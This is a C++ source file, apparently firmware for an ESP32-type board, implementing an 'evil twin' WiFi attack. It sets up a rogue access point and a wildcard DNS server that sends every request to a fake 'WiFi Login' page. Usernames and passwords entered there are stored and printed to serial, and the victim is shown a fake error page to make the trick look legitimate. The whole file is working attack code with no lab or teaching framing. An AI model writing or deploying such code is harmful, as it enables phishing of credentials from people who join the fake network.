#include "wifi_tools.h"
#include <WebServer.h>
#include <DNSServer.h>

static WebServer* _server = nullptr;
static DNSServer* _dns    = nullptr;

static char _capturedUser[64] = {};
static char _capturedPass[64] = {};
static bool _hasCapture        = false;

// Captive portal HTML — looks like a generic "WiFi Login" page
static const char PORTAL_HTML[] PROGMEM = R"rawlit(
<!DOCTYPE html><html><head>
<meta charset='UTF-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>WiFi Login</title>
<style>
  body{font-family:Arial,sans-serif;background:#1a1a2e;color:#eee;
       display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
  .box{background:#16213e;padding:2em;border-radius:12px;width:300px}
  h2{text-align:center;margin-bottom:1em}
  input{width:100%;padding:.6em;margin:.4em 0 1em;box-sizing:border-box;
        border:1px solid #444;border-radius:6px;background:#0f3460;color:#eee}
  button{width:100%;padding:.8em;background:#e94560;border:none;
         border-radius:6px;color:#fff;font-size:1em;cursor:pointer}
</style></head><body>
<div class='box'>
  <h2>WiFi Authentication</h2>
  <form method='POST' action='/login'>
    <label>Username</label>
    <input name='u' type='text' placeholder='Username' autocomplete='off'>
    <label>Password</label>
    <input name='p' type='password' placeholder='Password'>
    <button type='submit'>Connect</button>
  </form>
</div></body></html>
)rawlit";

static void handleRoot() {
    _server->send(200, "text/html", PORTAL_HTML);
}

static void handleLogin() {
    if (_server->hasArg("u") && _server->hasArg("p")) {
        strncpy(_capturedUser, _server->arg("u").c_str(), 63);
        strncpy(_capturedPass, _server->arg("p").c_str(), 63);
        _hasCapture = true;
        Serial.printf("[EvilTwin] Captured  user='%s'  pass='%s'\n",
                      _capturedUser, _capturedPass);
    }
    // Redirect to "error" to look legit
    _server->sendHeader("Location", "/?error=1");
    _server->send(302, "text/plain", "");
}

static void handleNotFound() {
    // Captive portal: redirect everything back to root
    _server->sendHeader("Location", "http://192.168.4.1/");
    _server->send(302, "text/plain", "");
}

bool EvilTwin::start(const char* ssid, uint8_t channel, const char* pass) {
    if (_running) stop();

    WiFi.mode(WIFI_AP);
    bool ok;
    if (pass && strlen(pass) >= 8) {
        ok = WiFi.softAP(ssid, pass, channel);
    } else {
        ok = WiFi.softAP(ssid, nullptr, channel);
    }

    if (!ok) {
        Serial.println("[EvilTwin] softAP failed");
        return false;
    }

    IPAddress apIP(192, 168, 4, 1);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));

    _dns = new DNSServer();
    _dns->setErrorReplyCode(DNSReplyCode::NoError);
    _dns->start(53, "*", apIP);

    _server = new WebServer(80);
    _server->on("/",       HTTP_GET,  handleRoot);
    _server->on("/login",  HTTP_POST, handleLogin);
    _server->onNotFound(handleNotFound);
    _server->begin();

    _running = true;
    _hasCapture = false;

    Serial.printf("[EvilTwin] AP '%s' ch%d — portal at %s\n",
                  ssid, channel, CAPTIVE_PORTAL_IP);
    return true;
}

void EvilTwin::stop() {
    if (_server) { _server->stop(); delete _server; _server = nullptr; }
    if (_dns)    { _dns->stop();   delete _dns;    _dns    = nullptr; }
    WiFi.softAPdisconnect(true);
    _running = false;
    Serial.println("[EvilTwin] stopped");
}

bool EvilTwin::checkCaptures() {
    if (_server) _server->handleClient();
    if (_dns)    _dns->processNextRequest();

    if (_hasCapture) {
        memcpy(capturedUser, _capturedUser, 64);
        memcpy(capturedPass, _capturedPass, 64);
        _hasCapture = false;
        return true;
    }
    return false;
}
